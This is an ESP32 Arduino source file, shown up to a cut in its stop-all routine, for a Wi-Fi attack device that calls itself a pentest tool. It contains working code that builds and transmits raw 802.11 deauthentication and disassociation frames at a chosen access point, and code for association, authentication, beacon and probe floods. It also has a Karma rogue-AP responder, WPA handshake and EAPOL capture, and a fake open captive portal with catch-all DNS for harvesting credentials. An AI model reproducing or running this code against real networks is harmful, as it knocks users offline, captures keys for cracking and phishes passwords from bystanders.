#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <esp_system.h>
#include <esp_event.h>
#include <nvs_flash.h>
#include <esp_log.h>
#include <esp_task_wdt.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

namespace Config {
  const int LED_PIN = 2;
  const char* AP_SSID = "TTAN_PenTest";
  const char* AP_PASSWORD = "pentester123";
  const int MAX_CREDENTIALS = 50;
  const int MAX_SCAN_RESULTS = 30;
  const int DEAUTH_INTERVAL = 20;
  const int DISASSOC_INTERVAL = 20;
  const int ASSOC_INTERVAL = 20;
  const int LED_BLINK_INTERVAL = 300;
  const int DNS_PORT = 53;
  const int WEB_PORT = 80;
  const int ADMIN_PORT = 8080;
  const int WATCHDOG_TIMEOUT = 100;
  const int MAX_STRING_LENGTH = 128;
  const int MAX_HANDSHAKES = 10;
  const int BEACON_INTERVAL = 50;
  const int PROBE_INTERVAL = 30;
  const int AUTH_INTERVAL = 20;
  const int PMKID_TIMEOUT = 30000;
  const int MONITOR_LOG_SIZE = 10;
  const int HOP_INTERVAL = 200;
}

struct HandshakeData {
  uint8_t bssid[6];
  uint8_t frames[4][256];
  uint16_t frameLengths[4];
  uint8_t frameCount;
  bool complete;
  unsigned long timestamp;
  
  HandshakeData() {
    memset(bssid, 0, 6);
    memset(frames, 0, sizeof(frames));
    memset(frameLengths, 0, sizeof(frameLengths));
    frameCount = 0;
    complete = false;
    timestamp = 0;
  }
};

struct PacketLog {
  uint8_t src[6];
  uint8_t dst[6];
  uint8_t type;
  uint8_t subtype;
  int16_t rssi;
  uint16_t len;
  unsigned long time;
  
  PacketLog() {
    memset(src, 0, 6);
    memset(dst, 0, 6);
    type = 0;
    subtype = 0;
    rssi = 0;
    len = 0;
    time = 0;
  }
};

struct SystemState {
  WebServer* server;
  WebServer* adminServer;
  DNSServer* dnsServer;
  bool dnsActive;
  
  bool deauthActive;
  bool disassocActive;
  bool assocFloodActive;
  bool pmkidActive;
  bool portalActive;
  bool snifferActive;
  bool handshakeActive;
  bool beaconFloodActive;
  bool probeFloodActive;
  bool authFloodActive;
  bool karmaActive;
  bool monitorActive;
  bool hopperActive;
  
  unsigned long totalRequests;
  unsigned long startTime;
  unsigned long deauthCount;
  unsigned long disassocCount;
  unsigned long assocCount;
  unsigned long packetCount;
  unsigned long eapolCount;
  unsigned long handshakeCount;
  unsigned long beaconCount;
  unsigned long probeCount;
  unsigned long authCount;
  unsigned long karmaCount;
  int credentialCount;
  
  unsigned long mgmtCount;
  unsigned long ctrlCount;
  unsigned long dataCount;
  unsigned long lastMonitorUpdate;
  int packetsPerSecond;
  PacketLog packetLogs[Config::MONITOR_LOG_SIZE];
  int logIndex;
  int hopChannel;
  
  String scanData;
  String hostData;
  String deauthData;
  String disassocData;
  String assocData;
  String pmkidData;
  String credentialData;
  String handshakeData;
  String beaconData;
  String probeData;
  String authData;
  String karmaData;
  String monitorData;
  
  String credentials[Config::MAX_CREDENTIALS];
  String currentPortalSSID;
  
  uint8_t targetBSSID[6];
  uint8_t broadcastMAC[6];
  int targetChannel;
  String targetSSID;
  
  unsigned long lastDeauth;
  unsigned long lastDisassoc;
  unsigned long lastAssoc;
  unsigned long lastBlink;
  unsigned long lastWatchdog;
  unsigned long lastBeacon;
  unsigned long lastProbe;
  unsigned long lastAuth;
  unsigned long lastHop;
  unsigned long lastPMKIDCheck;
  
  int errorCount;
  String lastError;
  
  HandshakeData handshakes[Config::MAX_HANDSHAKES];
  
  SystemState() : 
    server(nullptr),
    adminServer(nullptr),
    dnsServer(nullptr),
    dnsActive(false),
    deauthActive(false),
    disassocActive(false),
    assocFloodActive(false),
    pmkidActive(false),
    portalActive(false),
    snifferActive(false),
    handshakeActive(false),
    beaconFloodActive(false),
    probeFloodActive(false),
    authFloodActive(false),
    karmaActive(false),
    monitorActive(false),
    hopperActive(false),
    totalRequests(0),
    startTime(0),
    deauthCount(0),
    disassocCount(0),
    assocCount(0),
    packetCount(0),
    eapolCount(0),
    handshakeCount(0),
    beaconCount(0),
    probeCount(0),
    authCount(0),
    karmaCount(0),
    credentialCount(0),
    mgmtCount(0),
    ctrlCount(0),
    dataCount(0),
    lastMonitorUpdate(0),
    packetsPerSecond(0),
    logIndex(0),
    hopChannel(1),
    currentPortalSSID(""),
    targetChannel(1),
    lastDeauth(0),
    lastDisassoc(0),
    lastAssoc(0),
    lastBlink(0),
    lastWatchdog(0),
    lastBeacon(0),
    lastProbe(0),
    lastAuth(0),
    lastHop(0),
    lastPMKIDCheck(0),
    errorCount(0) {
    memset(targetBSSID, 0, 6);
    memset(broadcastMAC, 0xFF, 6);
  }
};

SystemState state;

namespace Packets {
  uint8_t deauthFrame[26] = {
    0xC0, 0x00, 0x00, 0x00,                    
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,        
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,        
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       
    0x00, 0x00,                                 
    0x07, 0x00                                  
  };
  
  uint8_t disassocFrame[26] = {
    0xA0, 0x00, 0x00, 0x00,                    
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,        
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,        
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       
    0x00, 0x00,                                 
    0x08, 0x00                                  
  };
  
  uint8_t beaconFrame[128] = {
    0x80, 0x00, 0x00, 0x00,                
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,    
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,    
    0x00, 0x00,                            
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x64, 0x00,                            
    0x31, 0x04,                            
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24, 
    0x03, 0x01, 0x06,                      
    0x05, 0x04, 0x00, 0x01, 0x00, 0x00    
  };
  
  uint8_t probeRequestFrame[64] = {
    0x40, 0x00, 0x00, 0x00,                
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,    
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    
    0x00, 0x00,                            
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24  
  };
  
  uint8_t probeResponseFrame[128] = {
    0x50, 0x00, 0x00, 0x00,                
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,    
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,    
    0x00, 0x00,                            
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x64, 0x00,                            
    0x31, 0x04,                            
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24, 
    0x03, 0x01, 0x06,                      
    0x05, 0x04, 0x00, 0x01, 0x00, 0x00    
  };
  
  uint8_t authFrame[30] = {
    0xB0, 0x00, 0x00, 0x00,                
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,    
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    
    0x00, 0x00,                            
    0x01, 0x00, 0x00, 0x00                 
  };
  
  uint8_t assocReqFrame[64] = {
    0x00, 0x00, 0x00, 0x00,                
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,    
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    
    0x00, 0x00,                            
    0x31, 0x04,                            
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  
  };
}

namespace Utils {
  void logError(const String& error) {
    state.errorCount++;
    state.lastError = error;
    Serial.println("ERROR: " + error);
  }
  
  String formatUptime(unsigned long ms) {
    unsigned long seconds = ms / 1000;
    unsigned long minutes = seconds / 60;
    unsigned long hours = minutes / 60;
    unsigned long days = hours / 24;
    
    if (days > 0) {
      return String(days) + "d " + String(hours % 24) + "h";
    } else if (hours > 0) {
      return String(hours) + "h " + String(minutes % 60) + "m";
    } else if (minutes > 0) {
      return String(minutes) + "m " + String(seconds % 60) + "s";
    }
    return String(seconds) + "s";
  }
  
  bool parseMACAddress(const String& mac, uint8_t* bssid) {
    if (mac.length() != 17) {
      logError("Invalid MAC length: " + String(mac.length()));
      return false;
    }
    
    int result = sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                       &bssid[0], &bssid[1], &bssid[2],
                       &bssid[3], &bssid[4], &bssid[5]);
    
    if (result != 6) {
      logError("MAC parse failed: " + mac);
      return false;
    }
    
    return true;
  }
  
  String macToString(const uint8_t* mac) {
    char buffer[18];
    snprintf(buffer, sizeof(buffer), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buffer);
  }
  
  String sanitizeString(const String& input) {
    if (input.length() == 0) return "";
    
    String output = "";
    int maxLen = min((int)input.length(), Config::MAX_STRING_LENGTH);
    
    for (int i = 0; i < maxLen; i++) {
      char c = input[i];
      if (isprint(c) && c != '<' && c != '>' && c != '&' && c != '"' && c != '\'') {
        output += c;
      }
    }
    return output;
  }
  
  bool isValidChannel(int channel) {
    return channel >= 1 && channel <= 13;
  }
  
  String encryptionTypeStr(wifi_auth_mode_t encType) {
    switch (encType) {
      case WIFI_AUTH_OPEN: return "OPEN";
      case WIFI_AUTH_WEP: return "WEP";
      case WIFI_AUTH_WPA_PSK: return "WPA";
      case WIFI_AUTH_WPA2_PSK: return "WPA2";
      case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
      case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-EAP";
      case WIFI_AUTH_WPA3_PSK: return "WPA3";
      case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/WPA3";
      default: return "UNKNOWN";
    }
  }
  
  void resetWatchdog() {
    esp_task_wdt_reset();
    state.lastWatchdog = millis();
  }
  
  String formatBytes(size_t bytes) {
    if (bytes < 1024) {
      return String(bytes) + " B";
    } else if (bytes < (1024 * 1024)) {
      return String(bytes / 1024.0) + " KB";
    } else {
      return String(bytes / 1024.0 / 1024.0) + " MB";
    }
  }
  
  void generateRandomMAC(uint8_t* mac) {
    unsigned long seed = millis();
    for (int i = 0; i < 6; i++) {
      seed = (seed * 1103515245 + 12345) & 0x7fffffff;
      mac[i] = (uint8_t)(seed >> 8);
    }
    mac[0] |= 0x02;
    mac[0] &= 0xFE;
  }

  String getFrameTypeStr(uint8_t type, uint8_t subtype) {
    if (type == 0x00) { 
      if (subtype == 0x08) return "Beacon";
      if (subtype == 0x04) return "Probe Req";
      if (subtype == 0x05) return "Probe Res";
      if (subtype == 0x00) return "Assoc Req";
      if (subtype == 0x01) return "Assoc Res";
      if (subtype == 0x0C) return "Deauth";
      if (subtype == 0x0A) return "Disassoc";
      return "Mgmt";
    } else if (type == 0x01) { 
      return "Ctrl";
    } else if (type == 0x02) { 
      return "Data";
    }
    return "Unknown";
  }
}

void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t *frame = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;
  
  if (len < 24) return;
  
  state.packetCount++;
  
  uint8_t frameType = (frame[0] & 0x0C) >> 2;
  uint8_t frameSubtype = frame[0] & 0xF0;
  
  if (state.monitorActive) {
    if (frameType == 0) state.mgmtCount++;
    else if (frameType == 1) state.ctrlCount++;
    else if (frameType == 2) state.dataCount++;
    
    state.packetLogs[state.logIndex].time = millis();
    state.packetLogs[state.logIndex].rssi = pkt->rx_ctrl.rssi;
    state.packetLogs[state.logIndex].len = len;
    state.packetLogs[state.logIndex].type = frameType;
    state.packetLogs[state.logIndex].subtype = frameSubtype;
    memcpy(state.packetLogs[state.logIndex].src, &frame[10], 6);
    memcpy(state.packetLogs[state.logIndex].dst, &frame[4], 6);
    
    state.logIndex = (state.logIndex + 1) % Config::MONITOR_LOG_SIZE;
  }
  
  if (state.karmaActive && frame[0] == 0x40) {
    uint8_t sourceMac[6];
    memcpy(sourceMac, &frame[10], 6);
    
    int ssidLen = frame[25];
    if (ssidLen > 0 && ssidLen < 33) {
      char ssid[33];
      memcpy(ssid, &frame[26], ssidLen);
      ssid[ssidLen] = '\0';
      
      memcpy(&Packets::probeResponseFrame[10], state.targetBSSID, 6);
      memcpy(&Packets::probeResponseFrame[16], state.targetBSSID, 6);
      memcpy(&Packets::probeResponseFrame[4], sourceMac, 6);
      
      uint32_t timestamp = millis();
      memcpy(&Packets::probeResponseFrame[24], &timestamp, 4);
      
      Packets::probeResponseFrame[38] = ssidLen;
      memcpy(&Packets::probeResponseFrame[39], ssid, ssidLen);
      
      uint16_t frameLen = 39 + ssidLen + 13;
      
      esp_wifi_80211_tx(WIFI_IF_AP, Packets::probeResponseFrame, frameLen, false);
      state.karmaCount++;
    }
  }
  
  if ((state.pmkidActive || state.handshakeActive) && len > 100) {
    if (frame[32] == 0x88 && frame[33] == 0x8E) {
      state.eapolCount++;
      
      uint8_t sourceMac[6];
      uint8_t bssid[6];
      memcpy(sourceMac, &frame[10], 6);
      memcpy(bssid, &frame[16], 6);
      
      if (state.pmkidActive) {
        state.pmkidData = "EAPOL #" + String(state.eapolCount) + " from " + 
                          Utils::macToString(sourceMac);
      }
      
      if (state.handshakeActive) {
        int handshakeIndex = -1;
        for (int i = 0; i < Config::MAX_HANDSHAKES; i++) {
          if (memcmp(state.handshakes[i].bssid, bssid, 6) == 0) {
            handshakeIndex = i;
            break;
          }
        }
        
        if (handshakeIndex == -1) {
          for (int i = 0; i < Config::MAX_HANDSHAKES; i++) {
            if (state.handshakes[i].frameCount == 0) {
              handshakeIndex = i;
              memcpy(state.handshakes[i].bssid, bssid, 6);
              state.handshakes[i].timestamp = millis();
              break;
            }
          }
        }
        
        if (handshakeIndex != -1 && !state.handshakes[handshakeIndex].complete) {
          uint8_t frameNum = (frame[29] & 0x03);
          
          if (frameNum >= 1 && frameNum <= 4 && state.handshakes[handshakeIndex].frameCount < 4) {
            bool haveFrame = false;
            for (int i = 0; i < state.handshakes[handshakeIndex].frameCount; i++) {
              uint8_t existingFrameNum = (state.handshakes[handshakeIndex].frames[i][29] & 0x03);
              if (existingFrameNum == frameNum) {
                haveFrame = true;
                break;
              }
            }
            
            if (!haveFrame) {
              uint16_t frameLen = min(len, (uint16_t)256);
              memcpy(state.handshakes[handshakeIndex].frames[state.handshakes[handshakeIndex].frameCount], 
                     frame, frameLen);
              state.handshakes[handshakeIndex].frameLengths[state.handshakes[handshakeIndex].frameCount] = frameLen;
              state.handshakes[handshakeIndex].frameCount++;
              
              if (state.handshakes[handshakeIndex].frameCount == 4) {
                state.handshakes[handshakeIndex].complete = true;
                state.handshakeCount++;
                state.handshakeData = "Complete handshake captured from " + 
                                     Utils::macToString(bssid) + " (" + 
                                     String(state.handshakeCount) + " total)";
              }
            }
          }
        }
      }
    }
  }
}

namespace Attacks {
  void sendDeauthPacket() {
    if (!state.deauthActive) return;
    memcpy(&Packets::deauthFrame[4], state.broadcastMAC, 6);
    memcpy(&Packets::deauthFrame[10], state.targetBSSID, 6);
    memcpy(&Packets::deauthFrame[16], state.targetBSSID, 6);
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, Packets::deauthFrame, sizeof(Packets::deauthFrame), false);
    if (result == ESP_OK) {
      state.deauthCount++;
      if (state.deauthCount % 100 == 0) {
        state.deauthData = "Active - Sent: " + String(state.deauthCount) + " pkts | CH: " + 
                           String(state.targetChannel) + " | Target: " + state.targetSSID;
      }
    }
  }
  
  void sendDisassocPacket() {
    if (!state.disassocActive) return;
    memcpy(&Packets::disassocFrame[4], state.broadcastMAC, 6);
    memcpy(&Packets::disassocFrame[10], state.targetBSSID, 6);
    memcpy(&Packets::disassocFrame[16], state.targetBSSID, 6);
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, Packets::disassocFrame, sizeof(Packets::disassocFrame), false);
    if (result == ESP_OK) {
      state.disassocCount++;
      if (state.disassocCount % 100 == 0) {
        state.disassocData = "Active - Sent: " + String(state.disassocCount) + " pkts | CH: " + 
                             String(state.targetChannel) + " | Target: " + state.targetSSID;
      }
    }
  }

  void sendAssocPacket() {
    if (!state.assocFloodActive) return;
    Utils::generateRandomMAC(&Packets::assocReqFrame[10]);
    memcpy(&Packets::assocReqFrame[16], state.targetBSSID, 6);
    Packets::assocReqFrame[24] = state.targetSSID.length();
    memcpy(&Packets::assocReqFrame[25], state.targetSSID.c_str(), state.targetSSID.length());
    
    uint16_t frameLen = 25 + state.targetSSID.length() + 4;
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, Packets::assocReqFrame, frameLen, false);
    if (result == ESP_OK) {
      state.assocCount++;
      if (state.assocCount % 50 == 0) {
        state.assocData = "Active - Sent: " + String(state.assocCount) + " pkts | Target: " + state.targetSSID;
      }
    }
  }
  
  bool startDeauth(const String& mac, int channel, const String& ssid = "") {
    if (mac.length() == 0) {
      Utils::logError("Empty MAC address");
      return false;
    }
    if (!Utils::parseMACAddress(mac, state.targetBSSID)) return false;
    if (!Utils::isValidChannel(channel)) {
      Utils::logError("Invalid channel: " + String(channel));
      channel = 1;
    }
    state.targetChannel = channel;
    state.targetSSID = ssid.length() > 0 ? ssid : "Unknown";
    esp_wifi_set_channel(state.targetChannel, WIFI_SECOND_CHAN_NONE);
    state.deauthActive = true;
    state.deauthCount = 0;
    state.deauthData = "Started on CH " + String(state.targetChannel) + " | Target: " + state.targetSSID;
    Serial.println("DEAUTH START: " + mac + " CH:" + String(channel));
    return true;
  }
  
  bool startDisassoc(const String& mac, int channel, const String& ssid = "") {
    if (mac.length() == 0) return false;
    if (!Utils::parseMACAddress(mac, state.targetBSSID)) return false;
    if (!Utils::isValidChannel(channel)) channel = 1;
    state.targetChannel = channel;
    state.targetSSID = ssid.length() > 0 ? ssid : "Unknown";
    esp_wifi_set_channel(state.targetChannel, WIFI_SECOND_CHAN_NONE);
    state.disassocActive = true;
    state.disassocCount = 0;
    state.disassocData = "Started on CH " + String(state.targetChannel) + " | Target: " + state.targetSSID;
    Serial.println("DISASSOC START: " + mac + " CH:" + String(channel));
    return true;
  }

  bool startAssocFlood(const String& mac, int channel, const String& ssid = "") {
    if (mac.length() == 0) return false;
    if (!Utils::parseMACAddress(mac, state.targetBSSID)) return false;
    if (!Utils::isValidChannel(channel)) channel = 1;
    state.targetChannel = channel;
    state.targetSSID = ssid.length() > 0 ? ssid : "Unknown";
    esp_wifi_set_channel(state.targetChannel, WIFI_SECOND_CHAN_NONE);
    state.assocFloodActive = true;
    state.assocCount = 0;
    state.assocData = "Started on CH " + String(state.targetChannel) + " | Target: " + state.targetSSID;
    Serial.println("ASSOC FLOOD START: " + mac + " CH:" + String(channel));
    return true;
  }
  
  void stopDeauth() {
    state.deauthActive = false;
    state.deauthData = "Stopped - Total: " + String(state.deauthCount) + " pkts";
    Serial.println("DEAUTH STOP");
  }
  
  void stopDisassoc() {
    state.disassocActive = false;
    state.disassocData = "Stopped - Total: " + String(state.disassocCount) + " pkts";
    Serial.println("DISASSOC STOP");
  }

  void stopAssocFlood() {
    state.assocFloodActive = false;
    state.assocData = "Stopped - Total: " + String(state.assocCount) + " pkts";
    Serial.println("ASSOC FLOOD STOP");
  }
  
  bool startPMKID(int channel) {
    if (!Utils::isValidChannel(channel)) channel = 1;
    state.targetChannel = channel;
    esp_wifi_set_channel(state.targetChannel, WIFI_SECOND_CHAN_NONE);
    
    wifi_promiscuous_filter_t filter = {
      .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(snifferCallback);
    esp_wifi_set_promiscuous(true);
    
    state.pmkidActive = true;
    state.packetCount = 0;
    state.eapolCount = 0;
    state.lastPMKIDCheck = millis();
    state.pmkidData = "Listening on CH " + String(state.targetChannel);
    
    Serial.println("PMKID START");
    return true;
  }
  
  void stopPMKID() {
    state.pmkidActive = false;
    esp_wifi_set_promiscuous(false);
    state.pmkidData = "Stopped - EAPOL: " + String(state.eapolCount);
    Serial.println("PMKID STOP");
  }
  
  bool startHandshake(int channel) {
    if (!Utils::isValidChannel(channel)) channel = 1;
    state.targetChannel = channel;
    esp_wifi_set_channel(state.targetChannel, WIFI_SECOND_CHAN_NONE);
    
    for (int i = 0; i < Config::MAX_HANDSHAKES; i++) {
      state.handshakes[i] = HandshakeData();
    }
    state.handshakeCount = 0;
    
    wifi_promiscuous_filter_t filter = {
      .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(snifferCallback);
    esp_wifi_set_promiscuous(true);
    
    state.handshakeActive = true;
    state.packetCount = 0;
    state.eapolCount = 0;
    state.handshakeData = "Listening on CH " + String(state.targetChannel);
    
    Serial.println("HANDSHAKE START");
    return true;
  }
  
  void stopHandshake() {
    state.handshakeActive = false;
    esp_wifi_set_promiscuous(false);
    state.handshakeData = "Stopped - Handshakes: " + String(state.handshakeCount);
    Serial.println("HANDSHAKE STOP");
  }
  
  bool startSniffer(int channel) {
    if (!Utils::isValidChannel(channel)) channel = 1;
    state.targetChannel = channel;
    esp_wifi_set_channel(state.targetChannel, WIFI_SECOND_CHAN_NONE);
    
    wifi_promiscuous_filter_t filter = {
      .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(snifferCallback);
    esp_wifi_set_promiscuous(true);
    
    state.snifferActive = true;
    state.packetCount = 0;
    
    Serial.println("SNIFFER START CH " + String(channel));
    return true;
  }
  
  void stopSniffer() {
    state.snifferActive = false;
    esp_wifi_set_promiscuous(false);
    Serial.println("SNIFFER STOP");
  }
  
  bool startMonitor(int channel, bool hop = false) {
    if (!Utils::isValidChannel(channel)) channel = 1;
    state.targetChannel = channel;
    state.hopperActive = hop;
    if(!hop) esp_wifi_set_channel(state.targetChannel, WIFI_SECOND_CHAN_NONE);

    wifi_promiscuous_filter_t filter = {
      .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(snifferCallback);
    esp_wifi_set_promiscuous(true);
    
    state.monitorActive = true;
    state.mgmtCount = 0;
    state.ctrlCount = 0;
    state.dataCount = 0;
    state.packetCount = 0;
    state.logIndex = 0;
    state.lastMonitorUpdate = millis();
    state.monitorData = hop ? "Hopping CH 1-13" : "Monitoring CH " + String(channel);
    
    Serial.println(hop ? "MONITOR HOPPER START" : "MONITOR START CH " + String(channel));
    return true;
  }

  void stopMonitor() {
    state.monitorActive = false;
    state.hopperActive = false;
    esp_wifi_set_promiscuous(false);
    state.monitorData = "Stopped - Total: " + String(state.packetCount);
    Serial.println("MONITOR STOP");
  }
  
  bool startPortal(String fakeSSID) {
    if (fakeSSID.length() == 0) fakeSSID = "Free_WiFi";
    fakeSSID = Utils::sanitizeString(fakeSSID);
    if (fakeSSID.length() == 0) return false;
    
    if (state.pmkidActive) stopPMKID();
    if (state.snifferActive) stopSniffer();
    if (state.handshakeActive) stopHandshake();
    if (state.monitorActive) stopMonitor();
    
    WiFi.softAP(fakeSSID.c_str(), "");
    delay(100);
    
    if (state.dnsServer->start(Config::DNS_PORT, "*", WiFi.softAPIP())) {
      state.dnsActive = true;
      state.portalActive = true;
      state.credentialCount = 0;
      state.currentPortalSSID = fakeSSID;
      state.credentialData = "Active as: " + fakeSSID;
      
      Serial.println("PORTAL START: " + fakeSSID);
      return true;
    }
    return false;
  }
  
  void stopPortal() {
    state.portalActive = false;
    state.dnsActive = false;
    state.dnsServer->stop();
    
    WiFi.softAP(Config::AP_SSID, Config::AP_PASSWORD);
    delay(100);
    
    state.credentialData = "Stopped - Captured: " + String(state.credentialCount);
    Serial.println("PORTAL STOP");
  }
  
  bool startBeaconFlood(int channel, const String& ssid = "") {
    if (!Utils::isValidChannel(channel)) channel = 1;
    state.targetChannel = channel;
    esp_wifi_set_channel(state.targetChannel, WIFI_SECOND_CHAN_NONE);
    
    state.beaconFloodActive = true;
    state.beaconCount = 0;
    state.targetSSID = ssid.length() > 0 ? ssid : "FakeAP";
    
    Utils::generateRandomMAC(state.targetBSSID);
    
    state.beaconData = "Flooding CH " + String(state.targetChannel);
    Serial.println("BEACON FLOOD START");
    return true;
  }
  
  void stopBeaconFlood() {
    state.beaconFloodActive = false;
    state.beaconData = "Stopped - Total: " + String(state.beaconCount);
    Serial.println("BEACON FLOOD STOP");
  }
  
  void sendBeaconPacket() {
    if (!state.beaconFloodActive) return;
    uint32_t timestamp = millis();
    memcpy(&Packets::beaconFrame[24], &timestamp, 4);
    
    uint8_t ssidLen = state.targetSSID.length();
    Packets::beaconFrame[38] = ssidLen;
    memcpy(&Packets::beaconFrame[39], state.targetSSID.c_str(), ssidLen);
    
    memcpy(&Packets::beaconFrame[10], state.targetBSSID, 6);
    memcpy(&Packets::beaconFrame[16], state.targetBSSID, 6);
    
    uint16_t frameLen = 39 + ssidLen + 13;
    
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, Packets::beaconFrame, frameLen, false);
    
    if (result == ESP_OK) {
      state.beaconCount++;
      if (state.beaconCount % 50 == 0) {
        state.beaconData = "Sent: " + String(state.beaconCount);
      }
    }
  }
  
  bool startProbeFlood(int channel, const String& ssid = "") {
    if (!Utils::isValidChannel(channel)) channel = 1;
    state.targetChannel = channel;
    esp_wifi_set_channel(state.targetChannel, WIFI_SECOND_CHAN_NONE);
    
    state.probeFloodActive = true;
    state.probeCount = 0;
    state.targetSSID = ssid.length() > 0 ? ssid : "TargetNetwork";
    
    Utils::generateRandomMAC(state.targetBSSID);
    
    state.probeData = "Flooding CH " + String(state.targetChannel);
    Serial.println("PROBE FLOOD START");
    return true;
  }
  
  void stopProbeFlood() {
    state.probeFloodActive = false;
    state.probeData = "Stopped - Total: " + String(state.probeCount);
    Serial.println("PROBE FLOOD STOP");
  }
  
  void sendProbePacket() {
    if (!state.probeFloodActive) return;
    uint8_t ssidLen = state.targetSSID.length();
    Packets::probeRequestFrame[24] = ssidLen;
    memcpy(&Packets::probeRequestFrame[25], state.targetSSID.c_str(), ssidLen);
    
    memcpy(&Packets::probeRequestFrame[10], state.targetBSSID, 6);
    
    uint16_t frameLen = 25 + ssidLen + 10;
    
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, Packets::probeRequestFrame, frameLen, false);
    
    if (result == ESP_OK) {
      state.probeCount++;
      if (state.probeCount % 50 == 0) {
        state.probeData = "Sent: " + String(state.probeCount);
      }
    }
  }
  
  bool startAuthFlood(const String& mac, int channel) {
    if (mac.length() == 0) return false;
    if (!Utils::parseMACAddress(mac, state.targetBSSID)) return false;
    if (!Utils::isValidChannel(channel)) channel = 1;
    
    state.targetChannel = channel;
    esp_wifi_set_channel(state.targetChannel, WIFI_SECOND_CHAN_NONE);
    
    state.authFloodActive = true;
    state.authCount = 0;
    
    Utils::generateRandomMAC(state.targetBSSID);
    
    state.authData = "Flooding CH " + String(state.targetChannel);
    Serial.println("AUTH FLOOD START");
    return true;
  }
  
  void stopAuthFlood() {
    state.authFloodActive = false;
    state.authData = "Stopped - Total: " + String(state.authCount);
    Serial.println("AUTH FLOOD STOP");
  }
  
  void sendAuthPacket() {
    if (!state.authFloodActive) return;
    Utils::generateRandomMAC(&Packets::authFrame[10]);
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, Packets::authFrame, sizeof(Packets::authFrame), false);
    if (result == ESP_OK) {
      state.authCount++;
      if (state.authCount % 50 == 0) {
        state.authData = "Sent: " + String(state.authCount);
      }
    }
  }
  
  bool startKarma(const String& ssid = "") {
    if (ssid.length() == 0) return false;
    state.targetSSID = ssid;
    state.karmaActive = true;
    state.karmaCount = 0;
    
    Utils::generateRandomMAC(state.targetBSSID);
    
    wifi_promiscuous_filter_t filter = {
      .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(snifferCallback);
    esp_wifi_set_promiscuous(true);
    
    state.karmaData = "Karma: " + state.targetSSID;
    Serial.println("KARMA START");
    return true;
  }
  
  void stopKarma() {
    state.karmaActive = false;
    esp_wifi_set_promiscuous(false);
    state.karmaData = "Stopped - Total: " + String(state.karmaCount);
    Serial.println("KARMA STOP");
  }
  
  void stopAllAttacks() {
    if (state.deauthActive) stopDeauth();
    if (state.disassocActive) stopDisassoc();
    if (state.assocFloodActive) stopAssocFlood();
    if (state.pmkidActive) stopPMKID();
    if (state.portalActive) stopPortal();
    if (state.snifferActive) stopSniffer();
    if (state.beaconFloodActive) stopBeaconFlood();
    if (state.probeFloodActive) stopProbeFlood();
